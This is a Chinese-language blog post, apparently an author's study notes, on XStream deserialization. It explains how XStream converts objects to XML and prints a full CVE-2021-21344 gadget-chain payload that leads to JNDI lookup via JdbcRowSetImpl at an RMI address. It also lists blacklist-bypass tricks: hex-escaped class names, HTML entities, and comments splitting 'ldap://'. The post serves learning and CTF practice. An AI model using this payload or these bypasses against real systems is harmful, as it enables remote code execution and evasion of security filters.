---
layout: post
title: Xstream反序列化远程代码执行（未解决）
categories: [blog ]
tags: [Java,]
description: "测验"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: cxkjy.github.io

---

## 前言

 ```
 这学期正好在开xml基础教程，据说 Xstream就是java+xml（bushi）
 Xstream是一个简单的基于java库，Java对象序列化到XML（进行Java对象和xml文档相互转换）
 
 看见了一个✌的github:https://github.com/Firebasky/ctf-Challenge
 都是极高质量的java题目
 https://paper.seebug.org/1543/
 ```

`Xstream支持其他的输出格式，如JSON`

### 下面通过一个小案例来演示Xstream如何将java对象序列化成xml数据

`People.java`

```java
package JYcxk;

import java.io.IOException;
import java.io.Serializable;

public class People implements Serializable{
    private String name;
    private int age;
    private Company workCompany;

    public People(String name, int age, Company workCompany) {
        this.name = name;
        this.age = age;
        this.workCompany = workCompany;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public Company getWorkCompany() {
        return workCompany;
    }

    public void setWorkCompany(Company workCompany) {
        this.workCompany = workCompany;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Read People");
    }
}
```

`Company.java`

```java
package JYcxk;
import java.io.IOException;
import java.io.Serializable;

public class Company implements Serializable {
    private String companyName;
    private String companyLocation;

    public Company(String companyName, String companyLocation) {
        this.companyName = companyName;
        this.companyLocation = companyLocation;
    }

    public String getCompanyName() {
        return companyName;
    }

    public void setCompanyName(String companyName) {
        this.companyName = companyName;
    }

    public String getCompanyLocation() {
        return companyLocation;
    }

    public void setCompanyLocation(String companyLocation) {
        this.companyLocation = companyLocation;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Company");
    }
}
```

```java
package JYcxk;

import com.thoughtworks.xstream.XStream;

public class test {
    public static void main(String[] args) {
        XStream xStream = new XStream();
        People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));
        String xml = xStream.toXML(people);
        System.out.println(xml);
    }
}
```

生成的为(分析一下这是怎么生成的呢)

```xml
<JYcxk.People serialization="custom">
    //首先是包名.类名 因为实现了序列化
  <JYcxk.People>
    <default>//用defalut包着属性
      <age>25</age>
      <name>xiaoming</name>
      <workCompany serialization="custom"> //因为workComany是Comany的值
        <JYcxk.Company>
          <default>     //同样的default
            <companyLocation>BeiJing</companyLocation>
            <companyName>TopSec</companyName>
          </default>
        </JYcxk.Company>
      </workCompany>
    </default>
  </JYcxk.People>
</JYcxk.People>
```

如果两个pojo类没有实现Serializable接口则序列化后的数据是以下这个样子

```xml
<com.XstreamTest.People>
  <name>xiaoming</name>
  <age>25</age>
  <workCompany>
    <companyName>TopSec</companyName>
    <companyLocation>BeiJing</companyLocation>
  </workCompany>
</com.XstreamTest.People>
```

可以在TreeMarshaller#convertAnother下断点

![image-20231005161747935](..\img\final\image-20231005161747935.png)

简单的说就是会根据数据类型获得相应的转换器，如果实现了序列化则是 SerializableConverter反之是ReflectionConverter转换器

![image-20231005161736778](..\img\final\image-20231005161736778.png)

`xml--->java`

```xml
package JYcxk;

import com.thoughtworks.xstream.XStream;

public class ob {
    public static String payload;
    public static void main(String[] args) {
        payload="<JYcxk.People serialization=\"custom\">\n" +
                "  <JYcxk.People>\n" +
                "    <default>\n" +
                "      <age>25</age>\n" +
                "      <name>xiaoming</name>\n" +
                "      <workCompany serialization=\"custom\">\n" +
                "        <JYcxk.Company>\n" +
                "          <default>\n" +
                "            <companyLocation>BeiJing</companyLocation>\n" +
                "            <companyName>TopSec</companyName>\n" +
                "          </default>\n" +
                "        </JYcxk.Company>\n" +
                "      </workCompany>\n" +
                "    </default>\n" +
                "  </JYcxk.People>\n" +
                "</JYcxk.People>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
```

![image-20231005162343256](..\img\final\image-20231005162343256.png)

![image-20231005162646480](..\img\final\image-20231005162646480.png)

发现执行了我们定义的readObject函数，这就是xstream的漏洞点，试想如果此时People是BadAttribute这些经典CC的类不就可以被rce了嘛（前提是需要有依赖）二个readobject都会被执行到。

`发现只有实现serializeable接口的才能执行它的readobject方法 `

##  CVE-2021-21344

首先，先打一下payload

```java
package JYcxk;

import com.thoughtworks.xstream.XStream;

public class ob {
    public static String payload;
    public static void main(String[] args) {
        payload="<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n" +
                "                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n" +
                "                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n" +
                "                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n" +
                "                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>\n" +
                "                      <uriProperties/>\n" +
                "                      <attributeProperties/>\n" +
                "                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n" +
                "                        <getter>\n" +
                "                          <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "                          <name>getDatabaseMetaData</name>\n" +
                "                          <parameter-types/>\n" +
                "                        </getter>\n" +
                "                      </inheritedAttWildcard>\n" +
                "                    </bi>\n" +
                "                    <tagName/>\n" +
                "                    <context>\n" +
                "                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n" +
                "                        <outer-class reference='../..'/>\n" +
                "                      </marshallerPool>\n" +
                "                      <nameList>\n" +
                "                        <nsUriCannotBeDefaulted>\n" +
                "                          <boolean>true</boolean>\n" +
                "                        </nsUriCannotBeDefaulted>\n" +
                "                        <namespaceURIs>\n" +
                "                          <string>1</string>\n" +
                "                        </namespaceURIs>\n" +
                "                        <localNames>\n" +
                "                          <string>UTF-8</string>\n" +
                "                        </localNames>\n" +
                "                      </nameList>\n" +
                "                    </context>\n" +
                "                  </bridge>\n" +
                "                </bridge>\n" +
                "                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\n" +
                "                  <javax.sql.rowset.BaseRowSet>\n" +
                "                    <default>\n" +
                "                      <concurrency>1008</concurrency>\n" +
                "                      <escapeProcessing>true</escapeProcessing>\n" +
                "                      <fetchDir>1000</fetchDir>\n" +
                "                      <fetchSize>0</fetchSize>\n" +
                "                      <isolation>2</isolation>\n" +
                "                      <maxFieldSize>0</maxFieldSize>\n" +
                "                      <maxRows>0</maxRows>\n" +
                "                      <queryTimeout>0</queryTimeout>\n" +
                "                      <readOnly>true</readOnly>\n" +
                "                      <rowSetType>1004</rowSetType>\n" +
                "                      <showDeleted>false</showDeleted>\n" +
                "                      <dataSource>rmi://localhost:1099/kbzskd</dataSource>\n" +
                "                      <params/>\n" +
                "                    </default>\n" +
                "                  </javax.sql.rowset.BaseRowSet>\n" +
                "                  <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                    <default>\n" +
                "                      <iMatchColumns>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                        <int>-1</int>\n" +
                "                      </iMatchColumns>\n" +
                "                      <strMatchColumns>\n" +
                "                        <string>foo</string>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                        <null/>\n" +
                "                      </strMatchColumns>\n" +
                "                    </default>\n" +
                "                  </com.sun.rowset.JdbcRowSetImpl>\n" +
                "                </jaxbObject>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
```

发现是可以通的

![image-20231005163502022](..\img\final\image-20231005163502022.png)

仔细跟进一下：

首先简单分析一下payload，最外层是</java.util.PriorityQueue>";说明是调用了这个类的readobject

好熟悉的链子，heapify()非常熟悉，隐约感觉是CB的链子

在PriorityQueue#readObject 下个断点跟一下

![image-20231005163835157](..\img\final\image-20231005163835157.png)

这里调用了comparator.compare,返回看payload发现这里comparator已经赋值了

![image-20231005164354373](..\img\final\image-20231005164354373.png)

![image-20231005164228355](..\img\final\image-20231005164231475.png)

接下来就是一系列的调用，最终会调用到 JdbcRowSetImpl的connect方法上

![image-20231005164612897](..\img\final\image-20231005164612897.png)

`这时想了一下如何写出来这个xml字符串的呢，莫非也是先通过java->xml然后再xml->java调用readobject？？？`

看了好几篇文章都只是直接拿现成的payload来复现，都没有讲述payload是如何构造的

正好复习一下这条链子

拿cc2的链子直接打了一下发现果然是这样

![image-20231005174653010](..\img\final\image-20231005174653010.png)

可惜CC2+jndi网上没有现成的文章。。。需要手动调试（太难了）

只能先耽搁起来，等时间富裕了继续搞！



![image-20231005181310871](..\img\final\image-20231005181310871.png)











### 实验了一下没想到成功了，xstream默认解析16进制

```php
 <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.6</version>
        </dependency>
```

u:0075

![image-20231005170624880](..\img\final\image-20231005170624880.png)















## Xstream绕过姿势

会默认转化16进制



`因为在XmlFriendlyNameCoder#decodeName方法中会对16进制进行解析`

![image-20231004201053269](..\img\final\image-20231004201053269.png)

```
<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>

就是先把_之前的保存下来，然后截取_.之后的四位也就是 007016进制转化再拼接上
```

![image-20231004201215274](..\img\final\image-20231004201215274.png)

![image-20231004201237821](..\img\final\image-20231004201237821.png)

#### 但是本地实验了一下直接改为16进制并没有成功，他也会进入到decodeName里面

然后在xml->Object上面我又加了一条语句，decodeName这次成功了

推测是因为decodeName在实现过程转化的后面，调试一下

![image-20231004205600147](..\img\final\image-20231004205600147.png)

![image-20231004205632395](..\img\final\image-20231004205632395.png)

### 针对标签属性内容的绕过

```java
<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="custom">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
```

此时的黑名单为custom,那么绕过方法可以为

```java
<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
```

原理为读取属性内容时，会做符合要求的转化

```
com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue
```

该函数内容比较多，不贴出来了，从883行到942行均在处理html编码格式，并将其转化为实际的字符

所以这里`&#111;`将转化为`o`



#### 案例

```
```

1. 针对标签内容的绕过

案例(看的✌的，没细跟)

```
<test>
ldap://xxxxx
</test>
```

此时的黑名单为`ldap://`，可以用如下的几种方法绕过

**a. html编码**

这部分在提取数据时，同样对html编码的内容做了转化

```
<test>
&#108;dap://xxxxx
</test>
```

这部分跟上面`标签属性内容的绕过`的一样，不再叙述

**b. 注释的方法**

在处理实际的标签内容时，遇到注视内容将被忽略掉

```
<test>
ld<!-- test -->ap://xxxxx
</test>

com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField
com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue
```



题目wp：连接https://blog.0kami.cn/writeups/2020/xnuca-2020-easyjava/#4-xstreamwaf